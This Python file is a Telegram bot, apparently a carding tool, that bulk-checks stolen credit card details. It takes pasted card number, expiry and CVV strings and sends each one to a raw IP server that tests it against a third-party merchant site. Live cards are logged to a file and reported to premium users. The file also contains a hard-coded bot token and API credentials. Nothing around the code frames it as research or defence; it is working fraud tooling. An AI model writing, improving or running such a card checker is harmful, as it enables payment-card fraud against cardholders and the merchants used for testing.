from telethon import TelegramClient, events
import json, os, re, asyncio, datetime
import aiohttp
import aiofiles

# ================== CONFIG ==================
API_ID = 37235723          # Keep these (can be dummy)
API_HASH = "880a876edaf529c8493b873d47821ec2"  # Keep these
BOT_TOKEN = "8783810252:AAEv2GtOJYG_-iBv1AMjvV8Le3kZBo9FJb0"

ADMIN_ID = [5248903529, 8496671308, 1308204344, 7856977111, 7029965057, 5295792382, 1965289355, 8467239599, 7249106493, 7292047135, 8368859527, 7582867285]

# Files
PREMIUM_FILE = "premium.json"
BANNED_FILE = "banned_users.json"
CC_FILE = "approved.txt"

# ================== STRIPE CHECKER ==================
async def check_stripe(card):
    try:
        url = f"http://138.128.240.15:8009/stripe_auth?cc={card}&site=redbluechair.com"
        
        timeout = aiohttp.ClientTimeout(total=50)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                if res.status != 200:
                    return {"Response": "HTTP Error", "Status": "Declined"}
                
                data = await res.json()
                response_text = data.get("Response", str(data))
                
                if isinstance(response_text, str) and response_text.startswith("{"):
                    try:
                        rj = json.loads(response_text)
                        response_text = rj.get("data", {}).get("error", {}).get("message", response_text)
                    except:
                        pass
                
                lower = str(response_text).lower()
                status = "Approved" if any(x in lower for x in ["approved", "success", "insufficient_funds"]) else "Declined"
                
                return {"Response": str(response_text)[:250], "Status": status}
    except Exception as e:
        return {"Response": f"Error: {str(e)[:80]}", "Status": "Declined"}


# ================== UTILITIES ==================
async def load_json(filename):
    try:
        if not os.path.exists(filename):
            async with aiofiles.open(filename, "w") as f:
                await f.write(json.dumps({}))
        async with aiofiles.open(filename, "r") as f:
            return json.loads(await f.read())
    except:
        return {}

async def save_json(filename, data):
    async with aiofiles.open(filename, "w") as f:
        await f.write(json.dumps(data, indent=4))

async def is_premium_user(user_id):
    data = await load_json(PREMIUM_FILE)
    if str(user_id) not in data: return False
    expiry = datetime.datetime.fromisoformat(data[str(user_id)]['expiry'])
    return datetime.datetime.now() <= expiry

async def is_banned_user(user_id):
    data = await load_json(BANNED_FILE)
    return str(user_id) in data

async def save_approved(card, response):
    async with aiofiles.open(CC_FILE, "a", encoding="utf-8") as f:
        await f.write(f"{card} | APPROVED | {response}\n")


# ================== BOT ==================
client = TelegramClient('stripe_bot', API_ID, API_HASH)

@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|help)$'))
async def start(event):
    if await is_banned_user(event.sender_id):
        return await event.reply("🚫 You are banned!")
    await event.reply("**🔥 Stripe Checker Bot**\nUse /mst to check cards")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]mst'))
async def mst(event):
    if await is_banned_user(event.sender_id):
        return await event.reply("🚫 Banned!")
    
    if event.is_private and not await is_premium_user(event.sender_id):
        return await event.reply("Premium required in PM.")

    text = (await event.get_reply_message()).text if event.reply_to_msg_id else event.raw_text
    cards = re.findall(r'\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', text)
    
    if not cards:
        return await event.reply("No valid cards found!")

    cards = cards[:80]
    asyncio.create_task(process_mass(event, cards))


async def process_mass(event, cards):
    total = len(cards)
    checked = approved = 0
    status_msg = await event.reply(f"🔥 Checking {total} cards...")

    for i in range(0, len(cards), 8):
        batch = cards[i:i+8]
        tasks = [check_stripe(card) for card in batch]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for card, res in zip(batch, results):
            if isinstance(res, Exception):
                res = {"Response": "Error", "Status": "Declined"}
            
            checked += 1
            if res.get("Status") == "Approved":
                approved += 1
                await save_approved(card, res.get("Response"))
                await event.reply(f"💎 **APPROVED**\n`{card}`\n{res.get('Response')}")

            try:
                await status_msg.edit(f"**Progress**\nApproved: {approved}\nChecked: {checked}/{total}")
            except:
                pass
            await asyncio.sleep(1.1)

    await status_msg.edit(f"✅ Done!\nApproved: {approved}/{total}")


# ================== RUN ==================
async def main():
    print("🚀 Stripe Bot Started | Site: redbluechair.com")
    await client.start(bot_token=BOT_TOKEN)
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
